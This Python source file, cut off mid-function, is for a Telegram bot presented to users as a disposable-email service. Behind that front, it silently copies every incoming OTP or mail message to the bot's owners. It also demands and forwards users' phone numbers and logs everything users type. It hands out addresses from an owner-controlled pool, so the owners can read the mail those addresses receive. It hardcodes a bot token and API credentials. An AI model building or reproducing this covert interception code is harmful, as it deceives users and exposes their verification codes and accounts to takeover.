import sqlite3
import logging
import random
import string
import re
import os
import threading
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ContextTypes, CallbackQueryHandler, ConversationHandler
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ================== CONFIG (ENV VARIABLES) ==================
BOT_TOKEN = os.getenv("BOT_TOKEN", "9259442048:AAEZd8_NvInXdUlPw3YHuSck-Cmo0Ofi7Gc")
API_ID = int(os.getenv("API_ID", "38746329"))
API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")

owner1_str = os.getenv("OWNER_ID_1", "7729056358")
owner2_str = os.getenv("OWNER_ID_2", "8808192812")

BASE_OWNERS = []
if owner1_str.isdigit(): BASE_OWNERS.append(int(owner1_str))
if owner2_str.isdigit(): BASE_OWNERS.append(int(owner2_str))

TARGET_BOT = "fakemailbot"

# States for Conversation
(ASK_PHONE, ASK_OTP, ASK_2FA, ASK_SAVE_MAIL, ASK_GROUP_LINK, ASK_ADD_OWNER) = range(6)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================== FLASK (FOR RENDER) ==================
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is alive and running!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ================== DATABASE ==================
DB_PATH = "fake_mail.db"

def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, phone TEXT, session_string TEXT, is_banned INTEGER DEFAULT 0)")
    c.execute("CREATE TABLE IF NOT EXISTS saved_mails (id INTEGER PRIMARY KEY AUTOINCREMENT, email_address TEXT UNIQUE)")
    c.execute("CREATE TABLE IF NOT EXISTS user_mails (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email_address TEXT UNIQUE)")
    c.execute("CREATE TABLE IF NOT EXISTS transfers (transfer_id TEXT PRIMARY KEY, email_address TEXT, from_user INTEGER, to_user INTEGER)")
    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS owners (user_id INTEGER PRIMARY KEY)")
    
    try:
        c.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass 

    for owner in BASE_OWNERS:
        c.execute("INSERT OR IGNORE INTO owners (user_id) VALUES (?)", (owner,))
        
    backup_emails = ["rokjbvq@hi2.in", "jjeznz@telegmail.com", "hzmmyg@hi2.in", "yxnldyc@hi2.in"]
    for email in backup_emails:
        try:
            c.execute("INSERT INTO saved_mails (email_address) VALUES (?)", (email,))
        except sqlite3.IntegrityError:
            pass

    conn.commit()
    conn.close()

init_db()

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH, timeout=10)
    c = conn.cursor()
    try:
        c.execute(query, params)
        conn.commit()
        res = c.fetchall()
    finally:
        conn.close()
    return res

def get_config(key, default=None):
    res = db_exec("SELECT value FROM config WHERE key=?", (key,))
    return res[0][0] if res else default

def set_config(key, value):
    db_exec("INSERT OR REPLACE INTO config (key, value) VALUES (?,?)", (key, value))

def get_all_owners():
    res = db_exec("SELECT user_id FROM owners")
    return [row[0] for row in res] if res else []

active_userbots = {}
temp_clients = {}

# ================== HELPER ==================
EMAIL_REGEX = re.compile(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})')

def find_user_by_email(text):
    match = EMAIL_REGEX.search(text)
    if match:
        email = match.group(1)
        res = db_exec("SELECT user_id FROM user_mails WHERE email_address=?", (email,))
        if res:
            return res[0][0]
    res = db_exec("SELECT user_id FROM user_mails ORDER BY id DESC LIMIT 1")
    return res[0][0] if res else None

async def notify_owners(context: ContextTypes.DEFAULT_TYPE, text: str):
    owners = get_all_owners()
    for owner in owners:
        try:
            await context.bot.send_message(chat_id=owner, text=text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Owner {owner} notify failed: {e}")

# ================== USERBOT (Telethon) ==================
async def start_userbot(user_id, session_str):
    if user_id in active_userbots:
        try:
            await active_userbots[user_id].disconnect()
        except Exception:
            pass

    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    logger.info(f"✅ Userbot connected for user {user_id}")

    @client.on(events.NewMessage(incoming=True))
    async def otp_listener(event):
        try:
            if not event.is_private:
                return

            sender = await event.get_sender()
            if not sender:
                return

            uname = (getattr(sender, "username", "") or "").lower()
            sender_id = getattr(sender, "id", None)
            is_target = (uname == TARGET_BOT.lower())

            if not is_target:
                try:
                    target_entity = await client.get_entity(TARGET_BOT)
                    if sender_id == target_entity.id:
                        is_target = True
                except Exception:
                    pass

            if not is_target:
                return

            logger.info("🎯 Target bot message detected!")

            full_text = event.message.message or ""
            if not full_text:
                return

            target_group = get_config("target_group")
            target_user_id = find_user_by_email(full_text)

            try:
                from telegram import Bot
                bot = Bot(BOT_TOKEN)
                if target_user_id:
                    owners = get_all_owners()
                    for owner in owners:
                        try:
                            await bot.send_message(
                                chat_id=owner, 
                                text=f"🔔 <b>OTP RECEIVED</b>\n👤 User ID: <code>{target_user_id}</code>\n\n{full_text}",
                                parse_mode="HTML"
                            )
                        except Exception:
                            pass
                await bot.close()
            except Exception as e:
                logger.error(f"Owner OTP notify failed: {e}")

            if target_group:
                group_target = target_group.strip()
                if group_target.startswith("https://t.me/") or group_target.startswith("http://t.me/"):
                    group_target = group_target.split("t.me/")[-1].strip("/")
                elif not group_target.startswith("@") and not group_target.lstrip("-").isdigit():
                    group_target = "@" + group_target

                try:
                    await client.send_message(group_target, full_text)
                except Exception as e:
                    logger.error(f"❌ Group send failed: {e}")

            try:
                from telegram import Bot
                bot = Bot(BOT_TOKEN)
                if target_user_id:
                    await bot.send_message(chat_id=target_user_id, text=full_text)
                await bot.close()
            except Exception as e:
                logger.error(f"User send failed: {e}")

        except Exception as e:
            logger.error(f"otp_listener error: {e}", exc_info=True)

# ================== BOT LISTENER (Group) ==================
async def group_listener(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    msg_text = update.message.text

    low = msg_text.lower()
    if "from:" not in low and "subject:" not in low:
        return

    target_user_id = find_user_by_email(msg_text)
    if not target_user_id:
        return

    await notify_owners(context, f"🔔 <b>GROUP OTP DETECTED</b>\n👤 User ID: <code>{target_user_id}</code>\n\n{msg_text}")

    try:
        await context.bot.send_message(chat_id=target_user_id, text=msg_text)
    except Exception as e:
        logger.error(f"Failed to send group OTP: {e}")

# ================== BOT COMMANDS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    # Check if user is new
    res = db_exec("SELECT user_id FROM users WHERE user_id=?", (user.id,))
    if not res:
        db_exec("INSERT INTO users (user_id) VALUES (?)", (user.id,))
        name = user.first_name or "Unknown"
        uname = f"@{user.username}" if user.username else "No Username"
        await notify_owners(context, f"🆕 <b>NEW USER STARTED</b>\nName: {name}\nUsername: {uname}\nID: <code>{user.id}</code>")
    
    text = (
        "Welcome to @FakeMailss_Bot The Most Advanced E-Mail Bot on Telegram.\n"
        "Send /generate to get your fakemail address.\n"
        "/set for customized fakemail address."
    )
    await update.message.reply_text(text)
    
    # State reset logic (taaki purana atka hua state clear ho jaye)
    return ConversationHandler.END

async def set_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "You can use your custom domain here.\n"
        "If you want to buy a new domain, buy from here: https://www.namesilo.com/register.php?rid=7312823ug\n"
        "After buying, send the domain to owner to add it."
    )
    await update.message.reply_text(text)

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user_id = update.effective_user.id
    if contact:
        db_exec("UPDATE users SET phone=? WHERE user_id=?", (contact.phone_number, user_id))
        await update.message.reply_text("Number Saved! Now send /generate again to get mail.")
        
        await notify_owners(context, f"📞 <b>CONTACT SHARED</b>\nUser ID: <code>{user_id}</code>\nPhone: {contact.phone_number}")

# --- GENERATE & DOMAIN SELECTION ---
async def generate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    ban_res = db_exec("SELECT is_banned FROM users WHERE user_id=?", (user_id,))
    if ban_res and ban_res[0][0] == 1:
        return await update.message.reply_text("🚫 You are banned from using this bot.")

    res = db_exec("SELECT phone FROM users WHERE user_id=?", (user_id,))
    if not res or not res[0][0]:
        kb = [[KeyboardButton("Share Contact", request_contact=True)]]
        return await update.message.reply_text(
            "Please share your contact first to generate a mail.",
            reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True, one_time_keyboard=True)
        )
        
    text = (
        "Select the domain you want to generate email address from.\n\n"
        "if you want more domains buy from this link https://www.namesilo.com/register.php?rid=7312823ug "
        "and read instructions from /set command on how to use your new domains."
    )
    kb = [
        [InlineKeyboardButton("@hi2.in", callback_data="domain_hi2")],
        [InlineKeyboardButton("@telegmail.com", callback_data="domain_tg")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), disable_web_page_preview=True)
    
    await notify_owners(context, f"⚙️ <b>/generate used</b> by User ID: <code>{user_id}</code>")

async def domain_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    ban_res = db_exec("SELECT is_banned FROM users WHERE user_id=?", (user_id,))
    if ban_res and ban_res[0][0] == 1:
        return await query.edit_message_text("🚫 You are banned from using this bot.")

    domain = "hi2.in" if query.data == "domain_hi2" else "telegmail.com"

    saved = db_exec("SELECT id, email_address FROM saved_mails LIMIT 1")
    if saved:
        mail_id, email_address = saved[0]
        db_exec("DELETE FROM saved_mails WHERE id=?", (mail_id,))
    else:
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        email_address = f"{random_str}@{domain}"

    try:
        db_exec("INSERT INTO user_mails (user_id, email_address) VALUES (?,?)", (user_id, email_address))
    except sqlite3.IntegrityError:
        pass

    await query.edit_message_text(
        f"Your new fakemail address is {email_address}\n"
        "send /id to see the full list."
    )
    
    await notify_owners(context, f"📧 <b>MAIL GENERATED</b>\nUser ID: <code>{user_id}</code>\nMail: {email_address}")

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    mails = db_exec("SELECT id, email_address FROM user_mails WHERE user_id=?", (user_id,))
    
    if not mails:
        return await update.message.reply_text("You have not generated any emails yet.")
        
    text = "List of address registered under your Telegram Account\n"
    for i, m in enumerate(mails, 1):
        text += f"{i}. {m[1]} | /delete_{m[0]}\n"
        
    await update.message.reply_text(text)

# --- DELETE CONFIRMATION ---
async def ask_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        mail_id = int(update.message.text.split("_", 1)[1])
    except (IndexError, ValueError):
        return await update.message.reply_text("Invalid format. Use /delete_<id>")
        
    res = db_exec("SELECT email_address FROM user_mails WHERE id=? AND user_id=?", (mail_id, user_id))
    if not res:
        return await update.message.reply_text("This email does not belong to you or does not exist.")
        
    email_address = res[0][0]
    
    text = (
        f"⚠️ Do you really want to delete your email address {email_address} ?\n\n"
        "ℹ️ NOTE:\n"
        "- You can not get back this address, if others take it.\n"
        "- If you want to safely transfer this email address to another telegram account use /transfer command."
    )
    kb = [
        [InlineKeyboardButton("Yes, Delete", callback_data=f"confirmdel_{mail_id}")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb))

async def confirm_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    mail_id = int(query.data.split("_")[1])
    
    res = db_exec("SELECT email_address FROM user_mails WHERE id=? AND user_id=?", (mail_id, user_id))
    if not res:
        return await query.edit_message_text("Email already deleted or not found.")
        
    email_address = res[0][0]
    
    db_exec("DELETE FROM user_mails WHERE id=?", (mail_id,))
    await query.edit_message_text(f"Your fakemail address {email_address} has been deleted.")
    
    await notify_owners(context, f"🗑 <b>MAIL DELETED</b>\nUser ID: <code>{user_id}</code>\nMail: {email_address}")

async def copy_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer("Copied!", show_alert=True)


# ================== TRANSFER SYSTEM ==================
async def transfer_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if len(args) != 2:
        return await update.message.reply_text("Usage: `/transfer email@domain.com user_id_or_username`", parse_mode="Markdown")
        
    email_address = args[0]
    target_user = args[1]
    
    res = db_exec("SELECT user_id FROM user_mails WHERE email_address=?", (email_address,))
    if not res:
        return await update.message.reply_text("This email address does not exist in our database.")
        
    owner_id = res[0][0]
    if owner_id != user_id:
        return await update.message.reply_text("You do not own this email address.")
        
    target_id = None
    if target_user.isdigit():
        target_id = int(target_user)
    else:
        try:
            chat = await context.bot.get_chat(target_user)
            target_id = chat.id
        except Exception:
            return await update.message.reply_text("Invalid user ID or username. Make sure the user has started the bot.")

    try:
        target_chat = await context.bot.get_chat(target_id)
        target_name = target_chat.first_name or "User"
    except Exception:
        target_name = "Unknown User"

    transfer_id = str(random.randint(100000, 999999))
    
    db_exec("INSERT INTO transfers (transfer_id, email_address, from_user, to_user) VALUES (?,?,?,?)",
            (transfer_id, email_address, user_id, target_id))
            
    text = (
        f"You are transferring ownership of {email_address} to {target_name} (userid: {target_id})\n\n"
        f"If you want to cancel, click /canceltransfer_{transfer_id}\n\n"
        f"If someone asked you to do this, it is scam. you must click /canceltransfer_{transfer_id} immediately.\n\n"
        f"`{email_address}`"
    )
    
    await update.message.reply_text(text, parse_mode="Markdown")
    
    await notify_owners(context, f"🔄 <b>TRANSFER INITIATED</b>\nFrom User: <code>{user_id}</code>\nTo User: <code>{target_id}</code>\nMail: {email_address}")

async def cancel_transfer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    command_text = update.message.text
    
    try:
        transfer_id = command_text.split("_")[1]
    except IndexError:
        return await update.message.reply_text("Invalid cancel command.")
        
    res = db_exec("SELECT email_address, from_user FROM transfers WHERE transfer_id=?", (transfer_id,))
    if not res:
        return await update.message.reply_text("Invalid or expired transfer request.")
        
    email_address, from_user = res[0]
    
    if from_user != user_id:
        return await update.message.reply_text("You cannot cancel this transfer.")
        
    db_exec("DELETE FROM transfers WHERE transfer_id=?", (transfer_id,))
    await update.message.reply_text(f"Transfer of {email_address} has been canceled.")

async def receive_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not args:
        return await update.message.reply_text("Usage: `/receive email@domain.com`", parse_mode="Markdown")
        
    email_address = args[0]
    
    res = db_exec("SELECT transfer_id, to_user FROM transfers WHERE email_address=?", (email_address,))
    if not res:
        res2 = db_exec("SELECT user_id FROM user_mails WHERE email_address=?", (email_address,))
        if res2:
            return await update.message.reply_text("This email address already taken by someone else.")
        else:
            return await update.message.reply_text("This email address does not exist.")
            
    transfer_id, to_user = res[0]
    
    if to_user != user_id:
        return await update.message.reply_text("This transfer is not for you.")
        
    db_exec("UPDATE user_mails SET user_id=? WHERE email_address=?", (user_id, email_address))
    db_exec("DELETE FROM transfers WHERE transfer_id=?", (transfer_id,))
    
    await update.message.reply_text(
        f"Email successfully transferred. Now you can receive mail from {email_address}\n"
        "Please check /id to confirm."
    )
    
    await notify_owners(context, f"✅ <b>TRANSFER RECEIVED</b>\nUser ID: <code>{user_id}</code>\nMail: {email_address}")

# ================== OWNER COMMANDS ==================
async def add_acc_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return ConversationHandler.END
    await update.message.reply_text("Enter Phone Number (+91...):")
    return ASK_PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    uid = update.effective_user.id
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        temp_clients[uid] = {'client': client, 'hash': sent.phone_code_hash, 'phone': phone}
        await update.message.reply_text("Enter OTP (space laga kar: 1 2 3 4 5):")
        return ASK_OTP
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    otp = update.message.text.strip().replace(" ", "").replace("-", "")
    try:
        await temp_clients[uid]['client'].sign_in(
            phone=temp_clients[uid]['phone'],
            code=otp,
            phone_code_hash=temp_clients[uid]['hash']
        )
        session = temp_clients[uid]['client'].session.save()
        phone = temp_clients[uid]['phone']
        db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)",
                (uid, phone, session))
        await start_userbot(uid, session)
        await update.message.reply_text("✅ Account Logged In Successfully! (Userbot Active)")
        return ConversationHandler.END
    except Exception as e:
        if "Two-step" in str(e) or "password" in str(e).lower():
            await update.message.reply_text("Enter 2FA Password:")
            return ASK_2FA
        await update.message.reply_text(f"Login Failed: {e}")
        return ConversationHandler.END

async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    try:
        await temp_clients[uid]['client'].sign_in(password=update.message.text.strip())
        session = temp_clients[uid]['client'].session.save()
        phone = temp_clients[uid]['phone']
        db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)",
                (uid, phone, session))
        await start_userbot(uid, session)
        await update.message.reply_text("✅ Account Logged In via 2FA! (Userbot Active)")
    except Exception as e:
        await update.message.reply_text(f"Failed: {e}")
    return ConversationHandler.END

async def ask_add_mail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return ConversationHandler.END
    
    # Agar user ne pehle koi command atka rakha hai, toh usko reset karne ke liye direct state return karo
    await update.message.reply_text("Send the fake email address to save (or /cancel to cancel):")
    return ASK_SAVE_MAIL

async def save_mail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text.strip()
    try:
        db_exec("INSERT INTO saved_mails (email_address) VALUES (?)", (email,))
        await update.message.reply_text(f"Email {email} saved successfully!")
    except sqlite3.IntegrityError:
        await update.message.reply_text("This email is already in the saved list.")
    return ConversationHandler.END

async def cancel_conv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Action canceled.")
    return ConversationHandler.END

async def del_mail_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return
    
    args = context.args
    if not args:
        return await update.message.reply_text("Usage: `/delmail email@domain.com`", parse_mode="Markdown")
    
    email_to_del = args[0]
    res = db_exec("SELECT id FROM saved_mails WHERE email_address=?", (email_to_del,))
    
    if not res:
        return await update.message.reply_text("This mail is not in the pool.")
        
    db_exec("DELETE FROM saved_mails WHERE email_address=?", (email_to_del,))
    await update.message.reply_text(f"✅ Email {email_to_del} deleted from pool.")

async def set_group_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return ConversationHandler.END
    await update.message.reply_text("Send the group link/username (or /cancel to cancel):")
    return ASK_GROUP_LINK

async def save_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    group = update.message.text.strip()
    set_config("target_group", group)
    await update.message.reply_text(f"Target Group set to: {group}")
    return ConversationHandler.END

async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return
    mails = db_exec("SELECT email_address FROM saved_mails")
    grp = get_config("target_group", "Not Set")
    text = f"👑 OWNER PANEL\n\nTarget Group: {grp}\nTotal Saved Mails in Pool: {len(mails)}\n\n"
    for m in mails:
        text += f"- {m[0]}\n"
    await update.message.reply_text(text)

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return
    users = db_exec("SELECT user_id, is_banned FROM users")
    if not users:
        return await update.message.reply_text("No users found.")
        
    text = "👥 Total Users & Their Mails:\n\n"
    for u in users:
        uid = u[0]
        is_banned = u[1]
        mails = db_exec("SELECT COUNT(*) FROM user_mails WHERE user_id=?", (uid,))
        mail_count = mails[0][0] if mails else 0
        status = "🚫 Banned" if is_banned == 1 else "✅ Active"
        text += f"User ID: `{uid}` | Mails: {mail_count} | {status}\n"
        
    await update.message.reply_text(text, parse_mode="Markdown")

# --- BAN / UNBAN SYSTEM ---
async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return
    args = context.args
    if not args:
        return await update.message.reply_text("Usage: /ban user_id")
    
    target_id = args[0]
    db_exec("UPDATE users SET is_banned=1 WHERE user_id=?", (target_id,))
    await update.message.reply_text(f"🚫 User {target_id} has been banned.")

async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return
    args = context.args
    if not args:
        return await update.message.reply_text("Usage: /unban user_id")
    
    target_id = args[0]
    db_exec("UPDATE users SET is_banned=0 WHERE user_id=?", (target_id,))
    await update.message.reply_text(f"✅ User {target_id} has been unbanned.")

async def bannedlist_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return
    users = db_exec("SELECT user_id FROM users WHERE is_banned=1")
    if not users:
        return await update.message.reply_text("No banned users.")
    
    text = "🚫 Banned Users:\n"
    for u in users:
        text += f"- `{u[0]}`\n"
    await update.message.reply_text(text, parse_mode="Markdown")

# --- ADD / REMOVE OWNER SYSTEM ---
async def ask_add_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return ConversationHandler.END
    await update.message.reply_text("Send the User ID of the person you want to make an Owner (or /cancel to cancel):")
    return ASK_ADD_OWNER

async def save_new_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    new_owner_id = update.message.text.strip()
    if not new_owner_id.isdigit():
        await update.message.reply_text("Invalid ID. Send numbers only.")
        return ConversationHandler.END
        
    try:
        db_exec("INSERT OR IGNORE INTO owners (user_id) VALUES (?)", (new_owner_id,))
        await update.message.reply_text(f"✅ User {new_owner_id} has been added as an Owner!")
    except Exception as e:
        await update.message.reply_text(f"Failed: {e}")
    return ConversationHandler.END

async def remove_owner_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return
    args = context.args
    if not args:
        return await update.message.reply_text("Usage: /removeowner user_id")
    
    target_id = int(args[0])
    if target_id in BASE_OWNERS:
        return await update.message.reply_text("You cannot remove base owners.")
        
    db_exec("DELETE FROM owners WHERE user_id=?", (target_id,))
    await update.message.reply_text(f"✅ User {target_id} has been removed from Owners.")

async def commands_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_all_owners():
        return
    text = (
        "👑 **Owner Commands:**\n"
        "/owner - View mail pool and group\n"
        "/addmail - Add new mail to pool\n"
        "/delmail - Delete a mail from pool\n"
        "/setgroup - Set target group for forwarding\n"
        "/users - View all users and their mail counts\n"
        "/ban user_id - Ban a user\n"
        "/unban user_id - Unban a user\n"
        "/bannedlist - View all banned users\n"
        "/addowner - Add a new owner\n"
        "/removeowner - Remove an owner\n"
        "/phone - Login a new Telegram account (Userbot)\n\n"
        "👤 **User Commands:**\n"
        "/start - Start the bot\n"
        "/generate - Generate a new email address\n"
        "/id - View your generated emails\n"
        "/set - Custom domain instructions\n"
        "/transfer - Transfer email to another user\n"
        "/receive - Receive a transferred email"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

# ================== CATCH-ALL LOGGER ==================
async def log_user_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in get_all_owners():
        return 
    
    if not update.message or not update.message.text:
        return
        
    user_id = update.effective_user.id
    name = update.effective_user.first_name or "Unknown"
    msg = update.message.text
    
    await notify_owners(context, f"💬 <b>USER MESSAGE</b>\nFrom: {name} (ID: <code>{user_id}</code>)\nText: {msg}")


# ================== MAIN ==================
def main():
    threading.Thread(target=run_flask, daemon=True).start()
    
    app_bot = Application.builder().token(BOT_TOKEN).build()

    # Login Conversation
    login_conv = ConversationHandler(
        entry_points=[CommandHandler("phone", add_acc_start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            ASK_OTP:   [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
            ASK_2FA:
